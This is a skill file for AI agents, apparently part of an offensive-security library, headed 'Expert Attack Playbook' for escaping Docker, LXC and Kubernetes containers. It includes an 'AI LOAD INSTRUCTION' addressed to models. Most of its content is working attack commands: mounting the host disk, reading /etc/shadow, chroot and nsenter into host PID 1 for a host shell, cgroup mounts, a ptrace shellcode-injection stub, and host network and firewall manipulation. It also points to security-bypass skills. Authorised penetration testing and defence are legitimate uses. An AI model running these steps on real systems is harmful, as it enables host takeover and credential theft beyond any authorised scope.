---
name: container-escape-techniques
description: 0. RELATED ROUTING
when-to-use: >-
  Container escape playbook. Use when operating inside a Docker container, LXC, or Kubernetes pod and need to escape to the host via privileged mode, capabilities, Docker socket, cgroup abuse, namespace tricks, or runtime vulnerabilities.
---

# SKILL: Container Escape Techniques — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert container escape techniques. Covers privileged container breakout, capability abuse, Docker socket exploitation, cgroup release_agent, namespace escape, runtime CVEs, and Kubernetes pod escape. Base models miss subtle escape paths via combined capabilities and cgroup manipulation.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) when you first need root inside the container before attempting escape
- [kubernetes-pentesting](../kubernetes-pentesting/SKILL.md) for K8s-specific attack paths beyond pod escape
- [linux-security-bypass](../linux-security-bypass/SKILL.md) when seccomp/AppArmor blocks your escape technique

### Advanced Reference

Also load [DOCKER_ESCAPE_CHAINS.md](./DOCKER_ESCAPE_CHAINS.md) when you need:
- Step-by-step escape chains for common misconfigurations
- Docker-in-Docker escape scenarios
- Kubernetes-specific escape paths with full command sequences

---

## 1. AM I IN A CONTAINER?

```bash
# Quick checks
cat /proc/1/cgroup 2>/dev/null | grep -qi "docker\|kubepods\|containerd"
ls -la /.dockerenv 2>/dev/null
cat /proc/self/mountinfo | grep -i "overlay\|docker\|kubelet"
hostname    # random hex = likely container

# Detailed check
cat /proc/1/status | head -5   # PID 1 is not systemd/init?
mount | grep -i "overlay"      # overlay filesystem?
ip addr                         # veth interface? limited NICs?
```

### Tools for Container Detection

```bash
# amicontained: shows container runtime, capabilities, seccomp
./amicontained

# deepce: Docker enumeration and exploit suggester
./deepce.sh

# CDK: all-in-one container pentesting toolkit
./cdk evaluate
```

---

## 2. PRIVILEGED CONTAINER ESCAPE

If `--privileged` flag was used, the container has nearly all host capabilities and device access.

### 2.1 Mount Host Filesystem

```bash
# Check if privileged
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = fully privileged

# Find host disk
fdisk -l 2>/dev/null || lsblk
# Usually /dev/sda1 or /dev/vda1

# Mount host root
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host

# Access host filesystem
cat /mnt/host/etc/shadow
chroot /mnt/host bash
```

### 2.2 nsenter (Enter Host Namespaces)

```bash
# From privileged container, enter host PID 1's namespaces
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# This gives a shell in the host's namespace context
# Effectively a full host shell
```

### 2.3 Privileged + Host PID Namespace

```bash
# If hostPID: true is set (Kubernetes)
# Access host processes via /proc
ls /proc/1/root/     # Host root filesystem
cat /proc/1/root/etc/shadow

# Inject into host process
nsenter --target 1 --mount -- bash
```

---

## 3. CAPABILITY-BASED ESCAPE

### 3.1 CAP_SYS_ADMIN — Most Versatile

```bash
# Check capabilities
capsh --print 2>/dev/null
grep CapEff /proc/self/status

# Escape via mounting
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
# Or mount host filesystem if device access exists
mount /dev/sda1 /mnt/host 2>/dev/null
```

### 3.2 CAP_SYS_PTRACE — Process Injection

```bash
# Inject shellcode into a host process (requires host PID namespace)
# Find a root process
ps aux | grep root

# Use gdb or python-ptrace to inject
python3 << 'EOF'
import ctypes
import ctypes.util

libc = ctypes.CDLL(ctypes.util.find_library("c"))

# Attach to host process, inject shellcode
# ... (full inject_shellcode implementation)
EOF
```

### 3.3 CAP_NET_ADMIN

```bash
# Manipulate host network if host network namespace is shared
# ARP spoofing, route manipulation, traffic interception
iptables -L            # Can see/modify host firewall rules?
ip route               # Can modify routing?
```

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
